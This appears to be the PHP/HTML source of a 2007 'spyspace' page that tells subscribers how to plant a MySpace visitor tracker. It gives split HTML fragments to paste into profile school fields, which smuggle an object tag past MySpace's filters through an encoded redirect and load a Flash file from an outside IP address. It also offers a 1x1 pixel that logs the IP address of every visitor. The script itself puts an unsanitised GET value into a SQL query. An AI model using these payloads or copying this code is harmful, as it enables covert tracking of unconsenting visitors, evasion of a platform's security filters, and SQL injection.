<html>
<head>
<title>spyspace - myspace tracker</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style>
td { font-family: tahoma, verdana, arial; font-size: 12px; letter-spacing: 1px; color:#666666; }
.head { font-size:12px; letter-spacing: 5px; }
.bighead { font-size:13px; letter-spacing: 64px; padding-top:50px; padding-bottom:30px; }
.explain2 { font-size: 11px; color:#999999; }
.instruct { font-size: 11px; color:#666666; text-align:left; width:500px; }
input { border:1px solid #cccccc; font-family: tahoma, verdana, arial; font-size: 12px; letter-spacing: 1px; }
.code { font-family: tahoma, verdana, arial; font-size: 11px; letter-spacing: 1px; border: 1px dashed #666; padding:4px; }
.codered { font-family: tahoma, verdana, arial; font-size: 11px; letter-spacing: 1px; border: 1px dashed darkred; padding:4px; }
textarea { border: 1px dashed #666; padding:4px; heigght:65px; }
.bignum { font-size:25px; color:#000000; font-weight:bold;}
</style>

<script language="javascript">
// Quicktime Detection  v1.0
// documentation: http://www.dithered.com/javascript/quicktime_detect/index.html
// license: http://creativecommons.org/licenses/by/1.0/
// code by Chris Nott (chris[at]dithered[dot]com)

/*
var quicktimeVersion = 0;
function getQuicktimeVersion() {
   var agent = navigator.userAgent.toLowerCase(); 
   
   // NS3+, Opera3+, IE5+ Mac (support plugin array):  check for Quicktime plugin in plugin array
   if (navigator.plugins != null && navigator.plugins.length > 0) {
      for (i=0; i < navigator.plugins.length; i++ ) {
         var plugin =navigator.plugins[i];
         if (plugin.name.indexOf("QuickTime") > -1) {
            quicktimeVersion = parseFloat(plugin.name.substring(18));
         }
      }
   }
   
   // IE4+ Win32:  attempt to create an ActiveX object using VBScript
   else if (agent.indexOf("msie") != -1 && parseInt(navigator.appVersion) >= 4 && agent.indexOf("win")!=-1 && agent.indexOf("16bit")==-1) {
     document.write('<scr' + 'ipt language="VBScript"\> \n');
      document.write('on error resume next \n');
      document.write('dim obQuicktime \n');
      document.write('set obQuicktime = CreateObject("QuickTimeCheckObject.QuickTimeCheck.1") \n');
      document.write('if IsObject(obQuicktime) then \n');
      document.write('   if obQuicktime.IsQuickTimeAvailable(0) then \n');
      document.write('      quicktimeVersion = CInt(Hex(obQuicktime.QuickTimeVersion) / 1000000) \n');
      document.write('   end if \n');
      document.write('end if \n');
      document.write('</scr' + 'ipt\> \n');
  }

   // Can't detect in all other cases
   else {
      quicktimeVersion = quicktimeVersion_DONTKNOW;
   }

   return quicktimeVersion;
}

quicktimeVersion_DONTKNOW = -1;

var quicktimeVersion = getQuicktimeVersion();
*/
</script>

</head>
<body bgcolor="#dcdfec" leftmargin="0" topmargin="0" bottommargin="0" rightmargin="0" marginwidth="0" marginheight="0">
<table width="900" height="100%" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td width="89" background="img/border_left.gif"><img src="img/trans.gif" width="89"></td>
    <td align="center" valign="top" bgcolor="#FFFFFF">
		<div class="bighead">&nbsp;spyspace</div><br>
<?
error_reporting(E_ALL ^ E_NOTICE);

include 'db.php';
include 'encrypt.php';

$userinfo_enc = $_COOKIE['ui'];
$userinfo_plaintext = md5_decrypt($userinfo_enc, $seedword);
$userinfo_array = explode('||',$userinfo_plaintext);
$ssusername_cookie = $userinfo_array[0];
$ssusername_cookie = htmlspecialchars($ssusername_cookie);
$ssusername_cookie = mysql_real_escape_string($ssusername_cookie);
$password = $userinfo_array[1];
$block = $userinfo_array[2];
$subscribed = $userinfo_array[3];


$ssusername = $_GET['ssusername'];
$ssusername = htmlspecialchars($ssusername);
if (!$ssusername) { 
?>
		<table border="0" align="center" cellpadding="0" cellspacing="0">
		<tr>
			<td colspan="2" height="60">html code instructions for existing users:</td>
		</tr>
		<form name="inst" method="get" action="instructions.php">
		<tr>
			<td align="right">tracker username:&nbsp;</td>
			<td><input name="ssusername" type="text" size="20" maxlength="20"></td>
		 </tr>
		 <tr>
			<td colspan="2" height="50" align="center"><input name="subm" type="submit" value=" get tracker code "></td>
		 </tr>
		</form>
		</table>
<?
} else {
	$sql = "SELECT ssusername, subscribed FROM users WHERE ssusername='$ssusername'";
	$result = mysql_query($sql);
	
	if (mysql_num_rows($result) > 0) {
		while ($userdata = mysql_fetch_object($result)) {
			$subscribedlevel = $userdata -> subscribed;  //no longer used as of 8/1/07
		}
		
		if (($subscribed < 1) || (!$subscribed)) {
			header("Location: sorry.php"); 
			exit();
		}
		
		if ($subscribedlevel > 0) { 
		?>
		<!--	<div class="instruct">
			<a href="#enhanced_code" style="color:#006699; font-weight:bold; text-decoration:none;">* click here for the enhanced code for donors.  thanks for donating!</a>
			<br><br><br>
			</div>
			-->
		<?
		}
		?>
		8/4/07 - this code has been blocked, and won't work.<br><br>
				<div class="instruct" style="text-decoration: line-through;">
				code instructions (updated 07/31/2007) <span style="color:#CC3333">
				<br><br>note: this code tracks internet explorer, safari, and firefox users.  please remove any previous tracker codes from your profile.  if you can't remove code from your networking section, try using <a href="http://editprofile.myspace.com/index.cfm?fuseaction=profile.editsafenetworking">safe mode</a>.</span><br><br>
				
<span class="bignum">1.</span> log into myspace in a new window, so you can come back to these instructions. click the <b>edit profile</b> link next to your picture on your home page.<br> 
<span class="bignum">2.</span> click on the blue <b>schools</b> link near the mid-top of the profile edit page.  add a new school.  choose <b>2007</b> to <b>2007</b> for <b>dates attended</b>.<br><br>
copy and paste this into the <b>major/concentration</b> field:
<form>
<textarea rows="2" cols="60">
&lt;xxxx xxxxx xxxxx xxxxx xxxxx xxxx&gt;&lt;object data="http://xxx.xxx/xxx.swf"&gt;</textarea>
</form>
<span class="bignum">3.</span> copy and paste this into the <b>minor</b> field:
<form>
<textarea rows="2" cols="60">
" data="http://205.134.170.241/s.swf" height=0 width=0 /&gt;&lt;p id="</textarea>
</form>
<span class="bignum">4.</span> 
copy and paste this into the <b>clubs</b> field:  
<form>
<textarea rows="5" cols="60">
&lt;img src="xxx.xxx/xxx.jpg" height=&lt;object data="http://profile.myspace.com/index.cfm?fuseaction=c%4Ds.%67o%74o&_u=http://205.134.170.241/s.swf"&gt;&lt;b id=s1s title="<?=$ssusername?>"&gt;&lt;/b&gt;</textarea>
</form>
click <b>submit</b>.
<br><br>
<span class="bignum">5.</span> you're done!  you'll see some messed up code on the page after you click submit, but that's fine.  it shouldn't be messed up on your profile.  to test it, you should look at your own myspace page while you're logged into myspace.  if you should need to delete your school, you should use safe mode:  <a href="http://editprofile.myspace.com/index.cfm?fuseaction=profile.editsafeschool">http://editprofile.myspace.com/index.cfm?fuseaction=profile.editsafeschool</a>  (delete the school and start over from scratch, don't edit it from safe mode)<br><br>
view your tracker results page here:  <a href="http://spyspace.cc/?u=<?=$ssusername?>">http://spyspace.cc/?u=<?=$ssusername?></a> (bookmark this page)<br>
				<br><br>

				important notes:  
				<li>once you've got it working, try not to update your school section!  myspace will filter the code out eventually, and the filtering occurs when you edit your profile.  spyspace will warn you when the code is being filtered as soon as it is known.  in general, make sure your profile is at a point where you wouldn't mind leaving it alone for a while, although i'm pretty sure it will be safe to edit any section besides "schools."</li>
				<br><br><br>
				

			</div>
		<?			
		if ($subscribedlevel > 0) { 
		?>
			<div class="instruct" style="color:#006699">
			<a name="enhanced_code"></a>
			<span style="font-size:14px; font-weight:bold;">* optional additional enhanced code:</span><br><br>
			add a this code to your <b>who i'd like to meet</b> field, or anywhere that you can put an image:<br><br>
			<div class="code">
			&lt;img src="http://205.134.170.241/img/<?=$ssusername?>.png" height="1" width="1"&gt
			</div><br>
			this will add terrifying blinking eyeballs to your spyspace.  no one seems to appreciate them, but they are actually quite useful.  sometimes people cannot be tracked by the main code, but this will log everyone's ip address who visits you.  when you click on the eyeball, it will attempt to match the unknown view to a previous person tracked by spyspace.
			<br><br><br>
			
			</div>
		<?
		}

			
	} else {
		echo "username <b>$ssusername</b> not found in database.  <br><br><br><a href=register.htm>click here</a> to register a new account.";
	}
}
?>						
		</td>
    <td width="89" background="img/border_right.gif"><img src="img/trans.gif" width="89"></td>
  </tr>
</table>
</body>
</html>